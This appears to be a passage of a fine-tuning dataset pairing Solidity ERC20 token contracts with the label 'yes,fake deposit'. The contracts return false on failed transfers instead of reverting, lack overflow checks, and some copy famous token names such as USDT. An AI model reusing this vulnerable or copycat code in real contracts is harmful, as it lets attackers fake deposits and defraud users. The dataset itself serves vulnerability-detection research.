value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n\n function totalSupply() constant returns (uint256 supply) {}\n\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\ncontract ERC20Token is StandardToken {\n\n function () {\n throw;\n }\n\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 10000000;\n totalSupply = 10000000;\n name = \"Anonymous Coin\";\n decimals = 0;\n symbol = \"ANON\";\n }\n\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\ncontract SHIBA_INU_v2 is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000*10**uint256(decimals);\n string public constant name = \"SHIBA INU v2\";\n string public constant symbol = \"SHIBB\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.16;\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract ERC20Token is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n\n \n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THESE VALUES FOR YOUR TOKEN\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 10000000000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 10000000000000; // Update total supply (100000 for example)\n name = \"HellBound Coin\"; // Set the name for display purposes\n decimals = 4; // Amount of decimals for display purposes\n symbol = \"HBC\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract TCP is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 250000000*10**uint256(decimals);\n string public constant name = \"Crypto Prophecies\";\n string public constant symbol = \"TCP\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n \n function () external payable {\n teamAddress.transfer(msg.value);\n }\n\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n\n \n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n\n function totalSupply() constant returns (uint256 supply) {}\n\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\ncontract ERC20Token is StandardToken {\n\n function () {\n throw;\n }\n\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 1000000000;\n totalSupply = 1000000000;\n name = \"pig.finance\";\n decimals = 0;\n symbol = \"PIG\";\n }\n\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract BretCoin is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n\n \n string public name = 'BretCoin'; //fancy name: eg Simon Bucks\n uint8 public decimals = 10; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol = 'BRET'; //An identifier: eg SBX\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THESE VALUES FOR YOUR TOKEN\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function BretCoin(\n ) {\n balances[msg.sender] = 210000000000000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 210000000000000000; // Update total supply (100000 for example)\n name = \"BretCoin\"; // Set the name for display purposes\n decimals = 10; // Amount of decimals for display purposes\n symbol = \"BRET\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract Biomutant_In_Game_Token is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"Biomutant In-Game Token\";\n string public constant symbol = \"$BIOM\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\ncontract AtlasTether {\n/// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n/// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n/// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n/// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n/// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n/// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\nevent Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\ncontract StandardToken is AtlasTether {\nfunction transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can\u2019t be over max (2\u00b2\u2075\u2076 \u2014 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn\u2019t wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\nfunction transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\nfunction balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\nfunction approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\nfunction allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\nmapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n//name this contract whatever you\u2019d like\ncontract Token is StandardToken {\nfunction () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n\n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It\u2019s like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n//\n// \u0628\u0631\u0627\u06cc \u062a\u0648\u06a9\u0646 \u062e\u0648\u062f \u0645\u0642\u062f\u0627\u0631\u0647\u0627\u06cc \u0632\u06cc\u0631 \u0631\u0627 \u062a\u063a\u06cc\u06cc\u0631 \u062f\u0647\u06cc\u062f\n//\n//make sure this function name matches the contract name above. So if you\u2019re token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\nfunction Token(\n ) {\n balances[msg.sender] = 100000; // \u062a\u0645\u0627\u0645 \u062a\u0648\u06a9\u0646\u0647\u0627\u06cc \u0633\u0627\u062e\u062a\u0647 \u0634\u062f\u0647 \u0633\u0627\u0632\u0646\u062f\u0647 \u0628\u0631\u0633\u062f -\u0639\u062f\u062f\u06cc \u0648\u0627\u0631\u062f \u06a9\u0646\u06cc\u062f \u0645\u062b\u0644\u0627 100000\n totalSupply = 1000000000; // \u062a\u0645\u0627\u0645 \u0639\u0631\u0636\u0647\n name = 'AtlasTether'; // \u0646\u0627\u0645 \u062a\u0648\u06a9\u0646\n decimals = 2; // \u0627\u0639\u0634\u0627\u0631\n symbol = 'USDT'; // \u0646\u0645\u0627\u062f \u062a\u0648\u06a9\u0646\n }\n\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n//call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn\u2019t have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3('receiveApproval(address,uint256,address,bytes)'))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract ERC20Token is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n\n \n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THESE VALUES FOR YOUR TOKEN\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 50000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 50000; // Update total supply (100000 for example)\n name = \"RadioInternacional.tv\"; // Set the name for display purposes\n decimals = 0; // Amount of decimals for display purposes\n symbol = \"RITV\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
